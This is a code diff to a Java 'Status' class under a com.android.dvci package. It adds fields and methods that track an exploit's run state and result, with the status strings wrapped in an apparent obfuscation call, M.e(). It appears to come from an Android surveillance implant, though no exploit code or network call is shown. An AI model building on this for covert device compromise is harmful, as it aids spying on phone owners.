@@ -28,6 +28,7 @@ import com.android.dvci.event.BaseEvent;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
+import com.android.mm.M;
 
 // Singleton Class
 /**
@@ -79,7 +80,22 @@ public class Status {
 
 	static public boolean wifiConnected = false;
 	static public boolean gsmConnected = false;
-	
+	public static final int EXPLOIT_STATUS_NONE = 0;
+	public static final int EXPLOIT_STATUS_RUNNING = 1;
+	public static final int EXPLOIT_STATUS_EXECUTED = 2;
+	public static final int EXPLOIT_STATUS_NOT_POSSIBLE = 3;
+
+
+
+	public static final int EXPLOIT_RESULT_NONE = 0;
+	public static final int EXPLOIT_RESULT_FAIL = 1;
+	public static final int EXPLOIT_RESULT_SUCCEED = 2;
+	public static final int EXPLOIT_RESULT_NOTNEEDED = 3;
+
+
+
+	private static int exploitStatus = EXPLOIT_STATUS_NONE;
+	private static int exploitResult = EXPLOIT_RESULT_NONE;
 	RunningProcesses runningProcess = new RunningProcesses();
 
 	/**
@@ -257,6 +273,56 @@ public class Status {
 
 		actionsMap.put(a.getId(), a);
 	}
+
+	static public int getExploitStatus() {
+		return exploitStatus;
+	}
+
+	static public void setExploitStatus(int es) {
+		exploitStatus = es;
+	}
+
+	static public int getExploitResult() {
+		return exploitResult;
+	}
+
+	static public void setExploitResult(int er) {
+		exploitResult = er;
+	}
+
+
+	static public String getExploitStatusString() {
+		switch (exploitStatus){
+			case EXPLOIT_STATUS_NONE:
+				return M.e("NOT RUN");
+			case EXPLOIT_STATUS_RUNNING:
+				return M.e("ON GOING");
+			case EXPLOIT_STATUS_EXECUTED:
+				return M.e("RUNNED");
+			case EXPLOIT_STATUS_NOT_POSSIBLE:
+				return M.e("NO POSSIBLE");
+			default:
+				break;
+		}
+		return M.e("UNKNOWN");
+	}
+
+	static public String getExploitResultString() {
+		switch (exploitResult){
+			case EXPLOIT_RESULT_FAIL:
+				return M.e("FAILED");
+			case EXPLOIT_RESULT_SUCCEED:
+				return M.e("SUCCEED");
+			case EXPLOIT_RESULT_NOTNEEDED:
+				return M.e("GOT ALREADY");
+			case EXPLOIT_RESULT_NONE:
+				return M.e("NO RESULT");
+			default:
+				break;
+		}
+		return M.e("UNKNOWN");
+	}
+
 
 	static public void setGlobal(Globals g) {
 		globals = g;
